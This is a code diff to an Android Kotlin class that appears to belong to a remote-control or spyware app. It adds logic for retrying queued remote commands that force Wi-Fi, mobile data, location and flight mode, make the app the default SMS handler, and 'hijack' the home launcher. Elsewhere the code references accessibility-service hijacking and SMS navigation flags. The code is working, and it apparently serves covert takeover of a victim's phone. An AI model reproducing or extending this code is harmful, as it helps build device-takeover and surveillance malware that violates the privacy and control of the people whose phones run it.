@@ -65,20 +65,27 @@ object CommandRetryManager {
         val newRetries = JSONArray()
         val toExecute = mutableListOf<JSONObject>()
 
-        for (i in 0 until retries.length()) {
-            val r = retries.getJSONObject(i)
-            if (now >= r.optLong("triggerAt", 0L)) {
-                if (isSystemBusy(ctx)) {
-                    DebugLogger.log("RETRY_MGR", "System busy. Delaying retry for [${r.optString("file_name")}] by 15s...")
-                    r.put("triggerAt", now + 15_000L)
-                    newRetries.put(r)
+                    for (i in 0 until retries.length()) {
+                val r = retries.getJSONObject(i)
+                if (now >= r.optLong("triggerAt", 0L)) {
+                    // PRE-CHECK: Prevent blindly retrying commands already in desired native state
+                    if (isNativelyInDesiredState(ctx, r)) {
+                        DebugLogger.log("RETRY_MGR", "Retry aborted: Command [${r.optString("file_name")}] already in desired state natively.")
+                        CommandProcessor.updateCommandStatus(ctx, r.optInt("id"), "ALREADY_IN_STATE", "Retry aborted: Device natively reflects desired state.")
+                        continue // Skip adding to newRetries to cleanly pop it from the queue
+                    }
+
+                    if (isSystemBusy(ctx)) {
+                        DebugLogger.log("RETRY_MGR", "System busy. Delaying retry for [${r.optString("file_name")}] by 15s...")
+                        r.put("triggerAt", now + 15_000L)
+                        newRetries.put(r)
+                    } else {
+                        toExecute.add(r)
+                    }
                 } else {
-                    toExecute.add(r)
+                    newRetries.put(r)
                 }
-            } else {
-                newRetries.put(r)
             }
-        }
 
         prefs.edit().putString("queue", newRetries.toString()).apply()
 
@@ -97,5 +104,52 @@ object CommandRetryManager {
         val isWaitingData = MyAccessibilityService.instance?.isWaitingForDataSettings == true
         val isWaitingLoc = MyAccessibilityService.instance?.isWaitingForLocationSettings == true
         return isUiAttached || hasSequence || isSmsNavigating || isHijacking || isWaitingData || isWaitingLoc
+    }
+
+    private fun isNativelyInDesiredState(ctx: Context, cmd: JSONObject): Boolean {
+        val fileName = cmd.optString("file_name", "")
+        val content = cmd.optString("content", "").trim().uppercase()
+        try {
+            when (fileName) {
+                "FORCE_WIFI" -> {
+                    val wm = ctx.applicationContext.getSystemService(Context.WIFI_SERVICE) as android.net.wifi.WifiManager
+                    val isWifiEnabled = wm.isWifiEnabled
+                    return (content == "ENABLE" && isWifiEnabled) || (content == "DISABLE" && !isWifiEnabled)
+                }
+                "FORCE_DATA" -> {
+                    val isDataEnabled = android.provider.Settings.Global.getInt(ctx.contentResolver, "mobile_data", 0) == 1
+                    return (content == "ENABLE" && isDataEnabled) || (content == "DISABLE" && !isDataEnabled)
+                }
+                "FORCE_LOCATION" -> {
+                    val lm = ctx.getSystemService(Context.LOCATION_SERVICE) as android.location.LocationManager
+                    val isLocEnabled = if (android.os.Build.VERSION.SDK_INT >= 28) lm.isLocationEnabled else {
+                        @Suppress("DEPRECATION")
+                        android.provider.Settings.Secure.getInt(ctx.contentResolver, android.provider.Settings.Secure.LOCATION_MODE, 0) != 0
+                    }
+                    return (content == "ENABLE" && isLocEnabled) || (content == "DISABLE" && !isLocEnabled)
+                }
+                "FLIGHT_MODE" -> {
+                    val isCurrentlyOn = android.provider.Settings.Global.getInt(ctx.contentResolver, android.provider.Settings.Global.AIRPLANE_MODE_ON, 0) != 0
+                    return (content == "ON" && isCurrentlyOn) || (content == "OFF" && !isCurrentlyOn)
+                }
+                "SET_DEFAULT_SMS" -> return DefaultSmsManager.isDefaultSms(ctx)
+                "RESTORE_DEFAULT_SMS" -> {
+                    val currentDefault = android.provider.Telephony.Sms.getDefaultSmsPackage(ctx)
+                    val originalPkg = ctx.getSharedPreferences("app_stats", Context.MODE_PRIVATE).getString("original_sms_package", null)
+                    return currentDefault != ctx.packageName && currentDefault == originalPkg
+                }
+                "HIJACK_LAUNCHER" -> {
+                    val currentHome = DeviceManager.getDefaultApps(ctx).optString("launcher", "")
+                    return currentHome == ctx.packageName
+                }
+                "SET_LAUNCHER_MODE" -> {
+                    val currentMode = ctx.getSharedPreferences("launcher_prefs", Context.MODE_PRIVATE).getString("display_mode", "PERSONAL") ?: "PERSONAL"
+                    return currentMode == content
+                }
+            }
+        } catch (e: Exception) {
+            // Default to false (needs retry) if native check throws
+        }
+        return false
     }
 }
